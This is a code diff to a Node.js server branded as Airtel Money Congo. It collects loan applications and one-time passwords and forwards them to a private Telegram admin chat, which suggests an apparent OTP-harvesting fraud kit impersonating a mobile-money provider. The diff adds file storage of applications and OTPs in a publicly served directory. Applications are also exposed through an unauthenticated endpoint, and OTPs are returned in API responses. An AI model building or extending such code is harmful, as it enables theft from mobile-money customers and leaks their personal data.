@@ -15,38 +15,63 @@ const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
 // Initialize Telegram Bot
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 
-// In-memory storage
-const applications = new Map();
-const otps = new Map();
+// ==================== FILE-BASED STORAGE ====================
+const DATA_FILE = path.join(__dirname, 'data.json');
+
+function loadData() {
+    try {
+        if (fs.existsSync(DATA_FILE)) {
+            const raw = fs.readFileSync(DATA_FILE, 'utf8');
+            const parsed = JSON.parse(raw);
+            return {
+                applications: new Map(parsed.applications || []),
+                otps: new Map(parsed.otps || [])
+            };
+        }
+    } catch (e) {
+        console.log('Error loading data:', e.message);
+    }
+    return { applications: new Map(), otps: new Map() };
+}
+
+function saveData() {
+    try {
+        const data = {
+            applications: Array.from(applications.entries()),
+            otps: Array.from(otps.entries())
+        };
+        fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
+    } catch (e) {
+        console.log('Error saving data:', e.message);
+    }
+}
+
+const { applications, otps } = loadData();
+
+// Auto-save every 30 seconds
+setInterval(saveData, 30000);
 
 // Middleware
 app.use(cors());
 app.use(bodyParser.json());
 
-// ==================== STATIC FILES FIX ====================
-// Determine the correct directory for static files
+// ==================== STATIC FILES ====================
 const STATIC_DIR = __dirname;
-
-// Log for debugging
-console.log('__dirname:', __dirname);
-
-// List all files in directory
 let filesInDir = [];
 try {
     filesInDir = fs.readdirSync(STATIC_DIR);
-    console.log('Files in directory:', filesInDir);
 } catch (e) {
     console.log('Error reading directory:', e.message);
 }
 
-// Find the actual index.html filename (case-insensitive)
-const indexFileName = filesInDir.find(f => f.toLowerCase() === 'index.html');
+const indexFileName = filesInDir.find(f => f.toLowerCase().replace(/\s+/g, '') === 'index.html');
 const INDEX_PATH = indexFileName ? path.join(STATIC_DIR, indexFileName) : path.join(STATIC_DIR, 'index.html');
 
-console.log('Resolved index file:', INDEX_PATH);
-console.log('Index file exists?', fs.existsSync(INDEX_PATH));
+console.log('__dirname:', __dirname);
+console.log('Files in directory:', filesInDir);
+console.log('Found index file name:', indexFileName || 'NOT FOUND');
+console.log('Resolved index path:', INDEX_PATH);
 
-// Serve static files from the current directory
 app.use(express.static(STATIC_DIR));
 
 // ==================== TELEGRAM BOT COMMANDS ====================
@@ -151,6 +176,7 @@ bot.on('callback_query', async (callbackQuery) => {
 
         const otp = generateOTP();
         otps.set(app.phone, { otp, appId, expiresAt: Date.now() + 10 * 60 * 1000 });
+        saveData(); // Save after state change
 
         bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Crédit approuvé! OTP envoyé au client.' });
 
@@ -166,6 +192,7 @@ bot.on('callback_query', async (callbackQuery) => {
         app.status = 'declined';
         app.decidedAt = new Date().toISOString();
         app.decidedBy = chatId;
+        saveData(); // Save after state change
 
         bot.answerCallbackQuery(callbackQuery.id, { text: '❌ Crédit refusé.' });
 
@@ -245,6 +272,7 @@ app.post('/api/apply', (req, res) => {
     };
 
     applications.set(appId, application);
+    saveData(); // Save after adding application
     sendApplicationToAdmin(application);
 
     res.json({ success: true, message: 'Demande soumise avec succès', applicationId: appId });
@@ -255,7 +283,7 @@ app.post('/api/verify-otp', (req, res) => {
     const stored = otps.get(phone);
 
     if (!stored) return res.status(400).json({ success: false, message: 'Aucun OTP trouvé' });
-    if (Date.now() > stored.expiresAt) { otps.delete(phone); return res.status(400).json({ success: false, message: 'OTP expiré' }); }
+    if (Date.now() > stored.expiresAt) { otps.delete(phone); saveData(); return res.status(400).json({ success: false, message: 'OTP expiré' }); }
     if (stored.otp !== otp) return res.status(400).json({ success: false, message: 'OTP invalide' });
     if (stored.appId !== applicationId) return res.status(400).json({ success: false, message: 'OTP ne correspond pas' });
 
@@ -264,6 +292,7 @@ app.post('/api/verify-otp', (req, res) => {
     app.otpVerified = true;
     app.verifiedAt = new Date().toISOString();
     otps.delete(phone);
+    saveData(); // Save after verification
 
     bot.sendMessage(ADMIN_CHAT_ID, 
         `🎉 *CRÉDIT TRAITÉ AVEC SUCCÈS*\n\n` + formatApplication(app) +
@@ -290,6 +319,7 @@ app.post('/api/resend-otp', (req, res) => {
 
     const otp = generateOTP();
     otps.set(phone, { otp, appId: applicationId, expiresAt: Date.now() + 10 * 60 * 1000 });
+    saveData(); // Save after updating OTP
     console.log(`📲 OTP renvoyé pour ${phone}: ${otp}`);
     res.json({ success: true, message: 'OTP renvoyé', testOtp: otp });
 });
@@ -298,32 +328,24 @@ app.get('/api/applications', (req, res) => {
     res.json({ success: true, count: applications.size, applications: Array.from(applications.values()) });
 });
 
-// ==================== FALLBACK ROUTE (SPA SUPPORT) ====================
-// This MUST come AFTER API routes and BEFORE app.listen
+// ==================== FALLBACK ROUTE ====================
 app.get('*', (req, res) => {
-    // Use the resolved index file path
     if (indexFileName && fs.existsSync(INDEX_PATH)) {
         res.sendFile(INDEX_PATH);
     } else {
-        // Last resort: try to read and send the file content directly
-        try {
-            const fileContent = fs.readFileSync(INDEX_PATH, 'utf8');
-            res.setHeader('Content-Type', 'text/html');
-            res.send(fileContent);
-        } catch (e) {
-            res.status(404).json({ 
-                error: 'index.html not found',
-                dirname: __dirname,
-                resolvedPath: INDEX_PATH,
-                indexFileName: indexFileName || 'not found',
-                filesInDir: filesInDir,
-                readError: e.message
-            });
-        }
+        res.status(404).json({ 
+            error: 'index.html not found',
+            dirname: __dirname,
+            resolvedPath: INDEX_PATH,
+            indexFileName: indexFileName || 'not found',
+            filesInDir: filesInDir
+        });
     }
 });
 
 app.listen(PORT, () => {
     console.log(`🚀 Airtel Money Congo Server running on port ${PORT}`);
     console.log(`🤖 Telegram Bot actif`);
+    console.log(`💾 Data file: ${DATA_FILE}`);
+    console.log(`📊 Loaded ${applications.size} applications`);
 });
